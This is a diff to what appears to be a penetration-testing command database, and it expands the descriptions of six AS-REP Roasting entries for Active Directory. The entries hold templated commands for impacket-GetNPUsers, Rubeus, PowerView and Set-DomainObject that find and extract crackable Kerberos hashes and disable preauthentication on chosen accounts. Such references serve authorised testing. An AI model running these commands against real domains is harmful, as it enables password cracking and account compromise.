@@ -3,7 +3,7 @@
     {
       "id": "impacket-getnpusers-asreproast",
       "name": "impacket-GetNPUsers - AS-REP Roasting Attack",
-      "description": "Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting)",
+      "description": "Extract AS-REP hashes from users with 'Do not require Kerberos preauthentication' enabled (AS-REP Roasting).\nTargets misconfigured accounts to obtain crackable password hashes without authentication.",
       "command": "impacket-GetNPUsers -dc-ip <DC_IP> -request -outputfile <OUTPUT_FILE> <DOMAIN>/<USERNAME>",
       "category": "password-attacks",
       "subcategory": "active-directory",
@@ -80,7 +80,7 @@
     {
       "id": "impacket-getnpusers-identify",
       "name": "impacket-GetNPUsers - Identify Vulnerable Users",
-      "description": "Enumerate users with 'Do not require Kerberos preauthentication' enabled without extracting hashes",
+      "description": "Enumerate users with 'Do not require Kerberos preauthentication' enabled without extracting hashes.\nIdentifies vulnerable accounts before attempting AS-REP Roasting attack.",
       "command": "impacket-GetNPUsers -dc-ip <DC_IP> <DOMAIN>/<USERNAME>",
       "category": "enumeration",
       "subcategory": "active-directory",
@@ -144,7 +144,7 @@
     {
       "id": "rubeus-asreproast",
       "name": "Rubeus - AS-REP Roasting (Windows)",
-      "description": "Extract AS-REP hashes from Windows domain-joined system using Rubeus",
+      "description": "Extract AS-REP hashes from Windows domain-joined system using Rubeus.\nNative Windows alternative to impacket-GetNPUsers with automatic domain context.",
       "command": ".\\Rubeus.exe asreproast /nowrap",
       "category": "password-attacks",
       "subcategory": "active-directory",
@@ -195,7 +195,7 @@
     {
       "id": "powerview-asreproast-identify",
       "name": "PowerView - Identify AS-REP Roastable Users",
-      "description": "Use PowerView to enumerate users with Kerberos preauthentication disabled",
+      "description": "Use PowerView to enumerate users with Kerberos preauthentication disabled.\nPowerShell-based identification of AS-REP Roasting targets with detailed attribute filtering.",
       "command": "Get-DomainUser -PreauthNotRequired -Properties samaccountname,memberof,pwdlastset",
       "category": "enumeration",
       "subcategory": "active-directory",
@@ -244,7 +244,7 @@
     {
       "id": "targeted-asreproast-set",
       "name": "Targeted AS-REP Roasting - Enable DONT_REQ_PREAUTH",
-      "description": "Set 'Do not require Kerberos preauthentication' on user account for targeted AS-REP roasting (requires GenericWrite/GenericAll)",
+      "description": "Set 'Do not require Kerberos preauthentication' on user account for targeted AS-REP roasting.\nRequires GenericWrite/GenericAll permissions - enables hash extraction on arbitrary accounts.",
       "command": "Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose",
       "category": "privilege-escalation",
       "subcategory": "active-directory",
@@ -296,7 +296,7 @@
     {
       "id": "targeted-asreproast-cleanup",
       "name": "Targeted AS-REP Roasting - Reset UAC (Cleanup)",
-      "description": "Remove 'Do not require Kerberos preauthentication' flag after targeted AS-REP roasting attack",
+      "description": "Remove 'Do not require Kerberos preauthentication' flag after targeted AS-REP roasting attack.\nCritical cleanup step to restore account security configuration after exploitation.",
       "command": "Set-DomainObject -Identity <USERNAME> -XOR @{useraccountcontrol=4194304} -Verbose",
       "category": "cleanup",
       "subcategory": "active-directory",
